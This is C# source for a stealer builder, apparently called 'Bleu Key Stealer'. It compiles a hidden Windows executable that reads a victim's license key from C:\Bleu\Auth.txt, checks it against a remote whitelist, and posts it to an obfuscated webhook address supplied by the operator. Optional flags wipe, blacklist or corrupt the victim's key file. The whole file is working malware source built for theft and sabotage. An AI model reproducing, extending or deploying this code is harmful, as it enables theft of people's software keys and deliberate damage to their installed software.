using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BKS_GUI
{
    class Stub
    {
        public static void Compile( bool wipe, bool blacklist, bool loop, string Name, string Webhook, bool Break)
        {
            
            var providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v4.0");
            CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions);
            string Output = Name + ".exe";
            System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
            //Make sure we generate an EXE, not a DLL
            parameters.ReferencedAssemblies.Add("System.Collections.dll");
            parameters.ReferencedAssemblies.Add("System.Collections.Specialized.dll");
            parameters.ReferencedAssemblies.Add("System.Linq.dll");
            parameters.ReferencedAssemblies.Add("System.Net.dll");
            parameters.ReferencedAssemblies.Add("mscorlib.dll");
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.CompilerOptions = "/target:winexe";

            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = Output;
            CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, @"using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.IO;


namespace BleuKeyStealer
{
    class Program
    {
        static string Key;
        static string Name = """ + Name + @""";
        static string dfas = """ + Webhook + @""";
        static void Main()
        {
            bool Wipe = " + wipe.ToString().ToLower() + @";
            bool BList = " + blacklist.ToString().ToLower() + @";
            bool Break = " + Break.ToString().ToLower() + @";
            string blacklist = ""USER_VDYVAZQEFOSO2PCCEHSF0C1NHWIWWHTTRW7JF2E5E6FPITAWRCW"";
            bool Loop = true;
            

            

            while (Loop == true)
            {

                string CheckAuth = @""C: \Users\Public\BleuAuth.txt"";
                try
                {
                    Key = System.IO.File.ReadAllText(@""C:\Bleu\Auth.txt"");
                }
                finally { }
                if (!File.Exists(CheckAuth))
                {
                    System.IO.File.WriteAllText(CheckAuth, ""Created"");
                }


                string Check = System.IO.File.ReadAllText(CheckAuth);

                if (Key == Check || Key == blacklist || Key == """" || Key == (Check + ""E"")) 
                {
                    return;
                }
			    else
				{
                    hjkl();
                    System.IO.File.WriteAllText(CheckAuth, Key);
                

                if (Wipe == true)
                {
                    try
                    {
                        System.IO.File.WriteAllText(@""C:\Bleu\Auth.txt"", """");
                    }
                    catch { }
                }
                else if (BList == true)
                {
                    try
                    {
                        System.IO.File.WriteAllText(@""C:\Bleu\Auth.txt"", blacklist);
                    }
                    catch { }
                }
                else if (Break == true)
                {
                    try
                    {
                        System.IO.File.WriteAllText(@""C:\Bleu\Auth.txt"", Key + ""E"");
                    }
                    catch { }
                }
            }
            System.Threading.Thread.Sleep(5000);
        }
        Loop = " + loop.ToString().ToLower() + @";
            }
    private static void hjkl()
    {
        var wc = new WebClient();
        if (wc.DownloadString(""https://bleu.cloris.co/Whitelist.php?step=1&key="" + Key) != ""0"")
        {
            return;
        }

        var Js = new NameValueCollection{
                {
                    ""username"",
                    Name + "" - Bleu Key Stealer""
                },
                {
                    ""avatar_url"",
                    ""https://i.imgur.com/WMUWDt3.png""
                },
                {
                    ""content"",
                    ""Bleu Key - "" + Key
                }
            };
        wc.UploadValues((new ASCIIEncoding()).GetString(Convert.FromBase64String(Enumerable.Range(0, dfas.Length / 2).Select(i => dfas.Substring(i * 2, 2)).Select(x => (char)Convert.ToInt32(x, 16)).Aggregate(new StringBuilder(), (x, y) => x.Append(y)).ToString())), Js);
        wc.Dispose();
    }
}
}");
            if (results.Errors.Count > 0)
            {

                foreach (CompilerError CompErr in results.Errors)
                {
                    Console.WriteLine(CompErr.ErrorText + CompErr.Line);
                }
            }
        }
    }
}
